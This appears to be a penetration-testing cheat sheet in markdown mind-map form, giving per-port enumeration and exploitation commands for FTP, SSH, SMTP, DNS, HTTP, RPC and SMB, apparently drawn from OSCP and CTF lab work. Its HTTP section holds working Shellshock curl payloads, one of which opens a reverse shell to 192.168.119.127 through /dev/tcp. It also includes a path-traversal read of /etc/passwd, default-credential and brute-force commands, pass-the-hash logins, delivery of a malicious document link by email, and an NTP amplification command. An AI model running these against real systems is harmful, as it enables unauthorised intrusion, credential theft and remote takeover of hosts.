---
markmap:
    colorFreezeLevel: 3
    initialExpandLevel: 2
---

# Ports & Services

## 21 » FTP
### Enumeration
#### NMAP
- `nmap -vv -p 20,21 -sT --script=ftp* $ip`

### Exploitation
#### Connect to the FTP server:
- `ftp $ip`

#### Try the following creds: 
- `anonymous:`
- `anonymous:anonymous`
- `ftp:ftp`
- `ftp://username:password@ftp.xyz.com`

#### download binary files (ascii)
- `get <filename>`

#### upload files (ascii)
- `put <filename>`


## 22 » SSH
### Enumeration
#### nmap
```text
# Send default nmap scripts for SSH
    nmap -p22 $ip -sC 
 # Retrieve version
    nmap -p22 $ip -sV
# Retrieve supported algorythms 
    nmap -p22 $ip --script ssh2-enum-algos 
nmap -p22 $ip --script ssh-hostkey --script-args
# Retrieve weak keys
ssh_hostkey=full 
# Check authentication methods
nmap -p22 $ip --script ssh-auth-methods --scriptargs="ssh.user=root" 
```
#### nc
- `nc -vn $ip 22`
#### ssh-keyscan
- `ssh-keyscan -t rsa $ip -p <PORT>`

### Exploitation
#### known bad keys
- `https://github.com/rapid7/ssh-badkeys/tree/master/authorized`
#### crackmapexec
- `crackmapexec ssh --help`
#### break out of jail
- `ssh name@$ip /bin/bash`
#### brute force
- ` hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 -u {IP} ssh`

#### Do you have UPLOAD potential?
```text
# Can you trigger execution of uploads?
    - Upload file from FTP client to FTP server.
    - After uploading files, FTP trigger is ignited.
    - FTP trigger executes script

# When trigger executes script, script can pass following information.
    - Uploaded file path
    - Uploaded file name
 - FTP user name who uploaded file.

» **NOTE:** May need to Swap binaries.
```

#### Check for Vulnerabilities in version / RCE? / 

#### Brute Force service

```shell
hydra -C /usr/share/seclist/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://10.2.2.31 
```

#### More Tools
```text
ssh-audit » https://github.com/jtesta/ssh-audit
sshfuzz » https://packetstormsecurity.com/files/download/71252/sshfuzz.txt
```

## 25,465,587 » SMTP
### Enumeration
#### nmap
- `nmap -p25 --script smtp-commands $ip`
#### nc
- `nc -vn $ip 25`
#### disclosure - ntlm auth
```text
telnet example.com 587
>> HELO
>> AUTH NTLM 334
```
#### disclosure - internal server name
```text
>> EHLO all
>> MAIL FROM: me
```
#### dig
- `dig +short mx google.com`
#### smtp/s
- `openssl s_client -crlf -connect smtp.mailgun.org:465` 
- `openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587`

### Exploitation

#### sendEmail
- deliver a pdf - `sendEmail -t pedro@thinc.local -f eric@thinc.local -s 10.11.1.229 -u statistics -a /home/kali/rdp_share/statistics.pdf`
#### swaks
```text
# deliver a .document 
    swaks --to itsupport@outdated.htb --from aceIzwild@pwned --server mail.outdated.htb --body "http://10.10.14.10/maldoc.doc"
# deliver a standard test email
    swaks --to [user@example.com](mailto:user@example.com) --server test-server.example.net
# use CRAM-MD5 authentication
    swaks --to [user@example.com](mailto:user@example.com) --from [me@example.com](mailto:me@example.com) --auth CRAM-MD5 --auth-user [me@example.com](mailto:me@example.com) --header-X-Test "test email"
# test for AV
    swaks -t [user@example.com](mailto:user@example.com) --attach - --server test-server.example.com --suppress-data </path/to/eicar.txt
# Test a spam scanner
    swaks --to [user@example.com](mailto:user@example.com) --body /path/to/gtube/file
```
#### More Tools
- serve - ` https://github.com/vercel/serve`


## 53 » DNS
### Enumeration
#### nmap
- `nmap -F --dns-server <dns server ip> <target ip range>`

#### whois
- `whois domain.name`

#### dig
```text
# ENUMERATION
    dig site.com
    dig {a|txt|ns|mx} domain.com
    dig {a|txt|ns|mx} domain.com @ns1.domain.com
    dig axfr @dns-server domain.name
    dig @10.10.10.10 -t NS domain.corp
    dig @10.10.10.10 _gc.domain.corp
    dig +nocmd shite.com MX +noall +answer
    dig +nocmd site.com NS +noall +answer
    dig +nocmd site.com A +noall +answer
    dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone

# Aone Transfer
    dig axfr @TheDNSServerYouWanToAsk domain
    dig axfr blah.com @ns1.blah.com
    dig a svcorp.com 
    dig txt svcorp.com 
    dig x svcorp.com 
```
#### host
```text
host -t {a|txt|ns|mx} megacorpone.comhost -a megacorpone.comhost -l megacorpone.com ns1.megacorpone.com
host -t axfr domain.name dns-server
host -t axfr thinc.local $ip
host -t ns site.com
host -l site.com ns2.site.com
host -t mx site.com
```

#### dnsrecon
```text
dnsrecon -d site.com
dnsrecon -d megacorpone.com -t axfr @ns2.megacorpone.com
dnsrecon -d megacorpone.com -t axfr
dnsrecon -d thinc.local -n $ip -t axfr -r 10.11.1.0/24
dnsrecon -r 10.11.1.0/24 -n <DNS IP>
dnsrecon -d $ip -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
dnsrecon -d $ip -D /usr/share/wordlists/dnsmap.txt -t std --xml ouput.xml
```

#### dnsenum
```text
dnsenum svcorp.com
dnsenum site.com –dnsserver ns1.site.com
dnsenum site.com -f /root/hostlist.txt
```

#### dnsmap
- `dnsmap site.com`

#### nslookup
```text
nslookup -> set type=any -> ls -d domain.com
nslookup site.com  
nslookup -query=mx site.com  
nslookup -query=ns site.com  
nslookup -query=any site.com

# DNS Zone Transfers
    nslookup set type=any -> ls -d blah.com
```

#### bash script
```text
# Domain name Reverse Lookup brute force
    for ip in $(seq 155 190);do host 50.7.67.$ip;done |grep -v "not found"
```

### Exploitation

## 69 » TFTP
### Enumeration

### Exploitation



## 80,443 » Web / HTTP
### 80 - INFO
```text
Assess the following:
» Robots.txt
» source code and comments  
» check Parameters, Headers & Cookies for SQL, XSS, LFI/ RFI 
» Common username:passowrd combinations for login & admin pages:
    admin:admin
    administrator:administrator
    test:test
    user:user
    user1:user1
```
#### Good2Know
- Note the subdomain can't be found with dirbuster wordlists
- grep staging-order /usr/share/dirbuster/wordlists/

### Enumeration

#### https
`testssl.sh -e -E -f -p -y -Y -S -P -c -H -U $ip | aha >  OUTPUT-FILE.html`

#### html error codes
```text
- 1xx informational response – the request was received, continuing process
- 2xx successful – the request was successfully received, understood, and accepted
- 3xx redirection – further action needs to be taken in order to complete the request
- 4xx client error – the request contains bad syntax or cannot be fulfilled
- 5xx server error – the server failed to fulfil an apparently valid request
```

#### Nmap Scanning for Web Service (HTTP/HTTPS)
- scanning for Web Service - `nmap -PN -p 22 --open -oG - 10.11.1. | awk '$NF~/ssh/{print $2}'`
- scanning for Web Service - `nmap 10.11.1. -p22,80 --open -oG - | awk '/22\/open.80\/open/{print $2}'`
- scanning for Web Service - `nmap 10.11.1. -p80,8080 --open -oG - | awk '/80\/open.8080\/open/{print $2}`
- scanning for Web Service - `nmap -p 80,8080 10.11.1.1-255`
- scanning for Web Service - `nmap -A -p 22,80,443 office.paper --script vuln -T4 -vvv`
- HTTP Form Fuzzer - `nmap --script http-form-fuzzer --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}'-p 80 $ip`
- using the PUT method - `nmap -sV --script http-put --script-args http-put.url=’/test/meterpreter4444.php’,http-put.file=’/root/Exam0119/pwd/192.168.111.149/meterpreter4444.php’ -p 80 192.168.111.149`
- use scripts - `nmap –script http-methods –script-args http-methods.url- path=’/uploads’,http-methods.test-all -p 8585 172.28.128.3`
- use scripts `nmap --script dns-brute,http-backup-finder,http-config-backup,http-rfi-spider,http-brute,http-default-accounts,http-put,http-enum`
- HTTP Enumeration with NMAP  - `nmap --script=http-enum -p80 -n $ip/24`
- Check the server methods - `nmap --script http-methods --script-args http-methods.url-path='/test' $ip`

#### netcat
- banner grabbing - `nc $ip <port>`
- banner grabbing - `echo -e 'GET / HTTP/1.1\r\n' | nc $RHOST $RPORT`

#### nikto
> 
```text
edit /etc/nikto.conf for the user agent
USERAGENT=Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)
```

- basic scan - `nikto -h $ip`
- HTTP - `nikto -h <IP or hostname> -Format+ txt`
- HTTPS - `nikto -h <IP or hostname> -ssl -Format+ txt`
- use Target.txt file - `nikto -h targetIP.txt`
- discover vulnerability & pair it with a weaponized exploit - `nikto -h <IP or hostname> -Format msf+`
- scan for SQLi Vulnerabilities - `nikto -Tuning 9 -h <IP or hostname>`
- Scan for everything exemp DOS - `nikto -Tuning x 6 -h <IP or hostname>'
- scan through a Proxy - `nikto -host http://10.11.1.44:8000'
- useproxy - `nikto -h 192.168.100.163 --useproxy http://192.168.100.163:3128`
- Save scan results to a file - `nikto -Display V -o results.html -Format htm -Tuning x 6 -h <IP or hostname>` 
- example - `nikto -host "http://10.13.38.21:5985" | tee "recon/nikto_10.13.38.21_5985.txt"`
- example - `nikto -Display V -o results.html -Format txt -Tuning x 6 -h <IP or hostname>` 
- example - `nikto -C all -h http://10.11.1.72"`
- example - `nikto -host 10.10.10.10[:8080] -output nikto.[name].txt`


#### enum site 
- `wget https://site.local -o foo-bar`


#### curl
- basic use - `curl -i -L 10.11.1.71` 
- https - `curl -I $URL -k`
- https - `curl -v $URL -i -H "Range: bytes=0-1023" -k`
- Upload Files - `curl -F ‘data=@path/to/local/file’ UPLOAD_ADDRESS`
- example - `curl -F 'img_avatar=@/home/petehouston/hello.txt' http://localhost/upload`
- Upload multiple files - `curl -F 'fileX=@/path/to/fileX' -F 'fileY=@/path/to/fileY' ... http://localhost/upload`
- Upload an array of files - `curl -F 'files[]=@/path/to/fileX' -F 'files[]=@/path/to/fileY' ... http://localhost/upload`
- You send off an HTTP upload using the -T option with the file to upload:
    `curl -T uploadthis http://example.com/`
- robots.txt - curl 10.11.1.71/robots.txt -s | html2text`
- cgi - `curl -i http://10.11.1.71/cgi-bin/admin.cgi`
- cgi - `curl -i http://10.11.1.71/cgi-bin/admin.cgi -s | html2text`
- cgi - `curl -i http://10.11.1.71/cgi-bin/test.cgi -s > test.cgi.txt`
- cgi - `curl 'http://10.11.1.71/cgi-bin/admin.cgi' -i -s > before`
- cgi - `curl 'http://10.11.1.71/cgi-bin/admin.cgi?list=../../../../../../../../../../etc/passwd' -i -s > after`
- cgi - `curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271 vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi`
- cgi - `curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'ls /home/root'" \http://10.11.1.71/cgi-bin/user.sh`
- cgi - `curl http://10.11.1.71/cgi-bin/admin.cgi -s > before`
- cgi - `curl -H 'User-Agent: () { :; }; echo "CVE-2014-6271  vulnerable" bash -c id' http://10.11.1.71/cgi-bin/admin.cgi -s >  after diff before after`
- robots.txt - `curl -i $ip robots.txt`
- 302 Error Eumeration - `curl -L http://sourceforge.net/projects/sofastatistics/files/latest/download?source=files -o foo.deb`
- Get Options available from web server - `curl -vX OPTIONS vm/test`
- chain 2 commands together - `curl -H "User-Agent: () { :; }; bash -c 'echo aaaa; uname -a; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi`

#### Curl and Netcat
```text
By using the "whereis" command, we can check to see if there is a match in the $PATH folders. 
This is used for programs to be executed (so you can do "nc" rather than "/bin/nc")`
```
- `curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa; nc  -h 2>&1; echo zzzz;'" http://10.11.1.71/cgi-bin/admin.cgi -s \  | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'` 
- `curl -H "User-Agent: () { :; }; /bin/bash -c 'echo aaaa;  bash -i >& /dev/tcp/192.168.119.127/443 0>&1; echo zzzz;'" \  http://10.11.1.71/cgi-bin/admin.cgi -s | sed -n '/aaaa/{:a;n;/zzzz/b;p;ba}'` 


#### Cewl site & generate wordlist
- `cewl $url -m 6 -w results.txt`
- depth=2,wordLength=5 - `cewl -d 2 -m 5 -w results.txt $url`
> test file - wc -l results.txt

#### Wordlists
```text
/seclists/Discovery/Web_Content/common.txt
/usr/share/wordlists/dirb/common.txt
/usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt
/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt 
/user/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt 
```

#### Content Discovery | feroxBuster
```text
Examples and demonstrations of all features
    https://epi052.github.io/feroxbuster-docs/docs/examples/
```
- specif aspx extention - `feroxbuster -u $url -x aspx -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt`
- specifying extensions - `feroxbuster -u $url -x pdf -x js,html -x php txt json,docx`
- IIS - `feroxbuster -u $url -w /usr/share/seclists/Discovery/Web-Content/IIS.fuzz.txt`
- multiple Headers - `./feroxbuster -u $url -H Accept:application/json "Authorization: Bearer {token}"`
- IPv6  - `feroxbuster -u http://[::1] --no-recursion -vv`
- read url from STDIN & pipe resulting urls to another tool `cat targets | feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files`
- proxy traffic via Burp - `feroxbuster -u $url --insecure --proxy http://127.0.0.1:8080`
- proxy traffic through a SOCKS proxy - `feroxbuster -u $url --proxy socks5h://127.0.0.1:9050`
- Pass auth token - `feroxbuster -u $url --query token=0123456789ABCDEF`
- extract links and dig - `feroxbuster -u $url --extract-links`
- make some noise - `feroxbuster -u $url -threads 200`
- slow it down - `feroxbuster -u $url --threads 30 --scan-limit 2`
- Send all 200/302 responses to a proxy - `feroxbuster -u $url --replay-proxy http://localhost:8080 --replay-codes 200 302 -insecure`
- abort or reduce scan speed - `feroxbuster -u http://127.1 --auto-bail 
`feroxbuster -u http://127.1 --auto-tune`

#### Content Discovery | gobuster
- specify extentions - `gobuster dir -u http://search.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,sql,txt,wpad,xlsx,xml,aspx -t 64`
- specify php extention - `gobuster dir -u 10.10.10.16 -x php -w /usr/share/wordlists/dirb/common.txt -t 20`
- use cookie - `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -b 400,404,500 -u http://10.10.10.10 -o [name].log -t 25 [-k] [-c cookie] [-a useragent]`
- use useragent - `gobuster dir --expanded --includelengeth --url http://site.htb --useragent "Mozilla ....."`
- supress error codes - `gobuster -u http://192.168.1.101 -w /usr/share/seclists/Discovery/Web_Content/common.txt -s '200,204,301,302,307,403,500' -e`
- use aginst frontpage - `gobuster dir -u http://10.11.1.X:80 -w /usr/share/seclists/Discovery/Web-Content/frontpage.txt`
- RobotsDisallowed - `gobuster -u http://$IP -w /usr/share/seclists/Discovery/Web_Content/Top1000-RobotsDisallowed.txt`
- include username:password - `gobuster dir -u http://testphp.vulnweb.com/login.php -w /usr/share/wordlists/dirb/common.txt -U test -P test` 
- https - `gobuster dir -k -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -t 20 -e -s 200,301,302 -u https://Reel2/`
- example - `gobuster -e -u http://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302`
- example - `gobuster dir -u http://10.11.1.209:8080/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 40 -x .php,.txt,.html,.asp -s "202"`
- example - `gobuster -u http://10.11.1.133/ -w /usr/share/wordlists/dirb/common.txt -q -n -e`
- example - `gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.209:80 -o recon/gobuster_10.10.10.209_80.txt`
- example - `gobuster dir -u http://10.11.1.73:8080 -w /usr/share/seclists/Discovery/Web-Content/CGIs.txt  \ -s '200,204,403,500' -e`
- example - `gobuster dir -u http://10.11.1.71/ -w /usr/share/seclists/Discovery/Web_Content/cgis.txt \  -s '200,204,301,302,307,403,500' -e`
- example - `gobuster dir -u http://192.168.119.127:8080/manager -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html`
- example - `gobuster dir -u http://10.11.1.222:8080/ --wordlist /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html,.jsp`


#### Content Discovery | dirb

- example - `dirb http://$RHOST/ wordlist.dict`
- example - `dirb http://$RHOST wordlist-/usr/share/wordlists/dirb/common.txt`
- example - `dirb http://$RHOST wordlist-/usr/share/wordlists/dirb/big.txt`
- example - `dirb http://$RHOST /usr/share/dirb/wordlists/vulns/iis.txt`
- example - `dirb http://$RHOST/index/sips/ /usr/share/dirb/wordlists/`
- example - `dirb http://$RHOST[:8080] -o dirb.[name].txt`
- example - `dirb http://$RHOST/books  /usr/share/seclists/Discovery/Web-Content/big.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.123/scans/tcp_BOOKS_http_dirb_big.txt"`
- example - `dirb http://$RHOST/books  /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.123/scans/tcp_BOOKS_http_dirb_SMALL.txt"`
- example - `dirb http://$RHOST:5985/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "/home/kali/Documents/oscp_labs/AutoRecon-Results/10.11.1.120/scans/tcp_5985_http_dirb_dirbuster.txt"`
- scan through a proxy - `dirb [http://$IP/](http://172.16.0.19/) -p $IP:3129`

#### Content Discovery | wfuzz
- fuzz username:password fields - `wfuzz -c -z file,users.txt -z file,pass.txt --sc 200 http://www.site.com/log.asp?user=FUZZ&pass=FUZ2Z`
- URLencode- `wfuzz -c -z file,fuzz.txt,urlencode https://vulnerable_site/userinfo?username=FUZZ`
- example - `wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 80 --hc 404 http://192.168.1.90/FUZZ`
- example - `wfuzz -c -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?FUZZ=test`
- example - `wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -d "username=FUZZ'||''==='&password=test" --hh 51 http://shoppy.htb/login`
- example - `wfuzz -c --hw 114 -w /usr/share/wfuzz/wordlist/general/megabeast.txt $ip:60080/?page=FUZZ`
- example - `wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt "$ip:60080/?page=mailer&mail=FUZZ"`
- example - `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 $ip/FUZZ Recurse level 3`
- example - `wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 $ip/FUZZ`
- example - `wfuzz -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 20 --hc '403,404' http://doctors.htb/FUZZ`
- example - `wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -t 20 --hc 404 https://source.cereal.htb/FUZZ`
- example - `wfuzz -c --hh 11 -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt http://10.10.10.245/?FUZZ=something`
- example - `wfuzz -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -d "username=FUZZ'||''==='&password=test" --hh 51 http://shoppy.htb/login`
- example - `wfuzz -c -z range,1-10 --hc=BBB http://www.site.com/FUZZ{something not there}`
- example - `wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ`
- example - `wfuzz -L -p 127.0.0.1:8080 -w usernames.txt -w passwords.txt -d "destination=https%3A%2F%2Freel2%2Fowa%2Fauth.owa&flags=0&forcedownlevel=0&trusted=0&username=FUZZ&password=FUZ2Z&isUtf8=1" -t 40 --hs "isn't correct" -H "Cookie: PBack=0" https://reel2/owa/auth.owa`

#### Content Discovery | ffuf
- File discovery with specific extensions - `ffuf -w <path-wordlist> -u http://test-url/FUZZ -e .aspx,.php,.txt,.html`
- fuzz specific file format - `ffuf -w <path-wordlist> -u http://test-url/FUZZ/backup.zip`
- Recursion - `ffuf -u https://test-url/FUZZ -w <path-wordlist> -recursion`
- brute force website - `ffuf -w <path-wordlist> -u https://test-url/FUZZ`
- fuzz parameters - `ffuf -w <path-wordlist> -u https://test-url?id=FUZZ`
- fuzz headers ` ffuf -w <path-wordlist> -u https://test-url -H "X-Header: FUZZ"`
- fuzz URL with POST method - `ffuf -w <path-wordlist> -u https://test-url -X POST -d "var=FUZZ"`
- fuzz substring - `ffuf -w <path-wordlist> -u https://test-url/testFUZZ`
- fuzz send POST request with fuzz data - `ffuf -w <path-wordlist> -X POST -d “username=admin\&password=FUZZ” -u http://test-url/FUZZ`
- filter based on status code - `ffuf -w <path-wordlist>-u https://test-url/FUZZ -fc 404,400`
- filter based on amount of words - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -fw <amount-of-words>`
- filter based on amount of words - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -fr <regex-pattern>`
- filter based on amount of lines - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -fl <amount-of-lines>`
- filter based on size of response - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -fs <size-of-response>`
- time : introduce delay (in seconds) by using -p - `ffuf -u http://test-url/FUZZ/ -w <path-wordlist> -p 1`
- time : control rate of sending packets - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -rate <rate-of-sending-packets>`
- time : run scan for specific time or less than specific time (in seconds) - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -maxtime 60`
- time : limit maximum time (in seconds) per job - `ffuf -w <path-wordlist> -u https://test-url/FUZZ -maxtime-job 60`
- time : speed or slow scan by using -t (default is 40) - `ffuf -u http://test-url/FUZZ/ -w <path-wordlist> -t 1000`
- Scan each domain with Wordlist1 - ffuf -u https://codingo.io/Wordlist1 -w <path-wordlist>:Wordlist1`
- Scan multiple domains with Wordlist1 - `ffuf -u https://Wordlist2/Wordlist1 -w <path-wordlist>:Wordlist1 <domain-list>:Wordlist2`
- save output by using -o and for format -of - `ffuf -u https://test-url/FUZZ/ -w <path-wordlist> -o output.html -of html`
- run scan in silent mode - `ffuf -u https://test-url/FUZZ -w <path-wordlist> -s`
- example - `ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '.html' -u "http://10.13.38.21:80/FUZZ" | tee "recon/ffuf_10.13.38.21_80.txt"`


#### Subdomain Discovery | subfinder
- install - `go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest`
- example - `subfinder -d hackerone.com`

#### Subdomain Discovery | gobuster 
```text
- subdomain lists
- grep staging-order /usr/share/seclists/Discovery/DNS/

- RESULTS
    /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt:staging-order
    /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt:www.staging-order
```

#### Subdomain Discovery | fuff
- `ffuf -H "Host: FUZZ.site.htb" -u http://site.htb -c -t 50 -mc 200 -w /path/to/seclists/DNS/bitquark-subdomains-top100000.txt -o output.fuff`
- `ffuf -w <path-wordlist> -u https://test-url/ -H "Host: FUZZ.site.com"`
- `ffuf -w ~/wordlists/subdomains.txt -H "Host: FUZZ.ffuf.me" -u http://ffuf.me`
- `ffuf -c -u http://devzat.htb -H "HOST:FUZZ.devzat" -w /user/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200`
- `ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u $url-H “Host: FUZZ.website.com”`
- `ffuf -c -u http://artcorp.htb/ -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host:FUZZ.artcorp.htb" -mc 200`
- `ffuf -u http://pets.devzat.htb/FUZZ -w /path/to/dirbuster/directory-list-2.3-medium.txt -fs 510`
- `ffuf -u http://pets.devzat.htb/FUZZ -w /path/to/seclists/Discover/Web-Content/raft-large-files-lowercase.txt -fs 510`
- `ffuf -ic -w /usr/share/wordlists/dirb/common.txt -e '' -u "http://10.13.38.21:5985/FUZZ" | tee "recon/ffuf_10.13.38.21_5985.txt"`


#### Subdomain Discovery | wfuzz
- `wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u "http://shoppy.htb/" -H "Host: FUZZ.shoppy.htb" --hl 7`
- `wfuzz -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.mango.htb" --hc 403,400 -t 150 10.10.10.162`
- `wfuzz -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt -H "Host: FUZZ.mango.htb" --hc 403,400 -t 80 10.10.10.162`


#### Subdomain Discovery | bash
- `for sub in $(cat subdomains.txt);do host $sub.domain.com|grep "has.address";done`



#### vhost discovery | gobuster
- `gobuster vhost -u mango.htb -w /usr/share/seclists/Discovery/DNS/dns-Jhaddix.txt`
- `gobuster vhost -u site.htb -w /usr/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -v`

#### vhost discovery | ffuf
- `ffuf -w <path-vhosts> -u https://test-url -H "Host: FUZZ"`

### Exploitation

#### clone site | wget
- `wget --mirror --convert-links --adjust-extension --page-requisites --no-parent https://site-to-download.com`
- `wget -mk -nH`

#### clone site | httrack
- `apt install httrack`

#### Payload Repository:
- `git clone https://github.com/payloadbox/directory-payload-list.git`



## 88 » KERBEROS
### Enumeration

### Exploitation

## 111 » NFS+RPCBIND
### Enumeration
- `mount -t nfs $ip:/ /mnt -o nolock`
### Exploitation






## 123 » NTP
### Enumeration
#### NMAP
- `nmap -sU -sV --script "ntp* and (discovery or vuln) and not (dos or brute)" -p 123 $ip`
- `nmap -n -Pn -sU -p 123 --script=ntp-info -oA %s/%s_ntp %s`

#### ntpq
```text
ntpq -c readlist <IP_ADDRESS>
ntpq -c readvar <IP_ADDRESS>
ntpq -c peers <IP_ADDRESS>
ntpq -c associations <IP_ADDRESS>
ntpdc -c monlist <IP_ADDRESS>
ntpdc -c listpeers <IP_ADDRESS>
ntpdc -c sysinfo <IP_ADDRESS>
```
#### ntp.conf
```text
Examine conf file
```

### Exploitation
#### ntp amplification attack
- `ntpdc -n -c monlist $ip`


## 135 » RPC
### 135 - INFO
```text
You can access the RPC locator service by using four protocol sequences:
ncacn_ip_tcp and ncadg_ip_udp (TCP and UDP port 135)
ncacn_np (the \pipe\epmapper named pipe via SMB)
ncacn_http (RPC over HTTP via TCP port 80, 593, and others)
```
### Enumeration
#### NMAP
- `NMAP $ip`
#### rpcdump
- `rpcdump -p 135 $ip`
####  rpcclint
##### connect to RPC - Null Authentication
- `rpcclient -U "" -N $ip`
- `rpcclient //machine.htb -U`
##### connect to RPC - PTH
- `domain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb --pwnt-hash`
##### list users
- `rpcclient $> enumdomusers`
##### query specific user
- `rpcclient $> queryuser 0x1f4`
##### list user descriptions
- `rpcclient $> querydispinfo`
#### smbclient
##### list smb shares
- `smbclient -L $ip`

#### ridenum
- RID Cycling - Null Sessions - `ridenum.py $ip 500 50000 dict.txt`

#### test for null Sessions 
- Windows - `net use \\$ip\IPC$ "" /u:""`
- Linux - `smbclient -L //$ip`

#### Enumerate users using MSRPC
- requires access to IPC$ - `//$ip/<share_name>`

#### lookupsid.py
- `lookupsid.py $ip`
- `lookupsid.py <user>:<password>@$ip`


### Exploitation
> ADD CONTENT

## 137 » Netbios
### Enumeration
#### nmap
- `sudo nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n $ip`
- `nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 $ip`

#### smblookup
- enum hostname - `smblookup -A $ip`

#### nbtscan
- `nbtscan $ip/30`
- `nbtscan -r $ip/24`

#### recusively download files
```text
smb: > recurse ON
smb: > prompt OFF
smb: > mget *```
```

#### net use
- `net use \\$ip\IPC$`

### Exploitation
> ADD CONTENT

## 139,445 » SMB
### Enumeration
```text
Questions
    - Do you have creds?
    - Can you access shares?
    - Are there any exploitable MSxx-xxx versions?
    - Is it worth burning MSF strike?
```
#### nmap
- os discovery - `sudo nmap -v -sSVC -p 445 --script smb-os-discovery $ip`
- open smb shares - `nmap -Pn --script smb-enum-shares -p 139,445 10.11.1.146`
- open smb shares - `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 192.168.10.0/24`
- enum smb users `nmap -sU -sS --script=smb-enum-users -p U:137,T:139 192.168.11.200-254 $ip`
- vulnerable smb servers - `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 $ip`
- list all smb scripts - `ls -l /usr/share/nmap/scripts/smb*`
- vuln scans - `nmap --script=smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse -p445 $ip`
- fuzzer - `nmap -sV -Pn -vv -p 445 –script=’(smb*) and not (brute or broadcast or dos or external or fuzzer)’ –script-args=unsafe=1 $ip`

#### smbmap
- null - `smbmap -H $ip [-P <PORT>] #Null user`
- creds - `smbmap -u "username" -p "password" -H $ip [-P <PORT>] `
- anon - smbmap -H $ip -u 'anonymous' -p 'anonymous' 
- pass-the-hash - `smbmap -u "username" -p "<NT>:<LM>" -H $ip [-P <PORT>]` 
- Search for a file and download - `sudo smbmap -R Folder -H $ip -A <FileName> -q`
- non-recursive list `smbmap -u sqlserver -p shantewhite -d XOR.COM -H 10.11.1.120`
- recursive mode. download files inside /usr/share/smbmap - `smbmap [-u "username" -p "password"] -r [Folder] -H $ip [-P <PORT>]`
- list everything - `smbmap [-u "username" -p "password"] -R [Folder] -H $ip [-P <PORT>]` 
- example - `smbmap -u sqlserver -p shantewhite -d XOR.COM -H 10.11.1.120` 
- example - `smbmap -H "10.13.38.21" | tee "recon/smbmap_10.13.38.21.txt"`

#### smbclient
- `smbclient //MOUNT/share -I $ip -N`
- `smbclient -L //$ip`

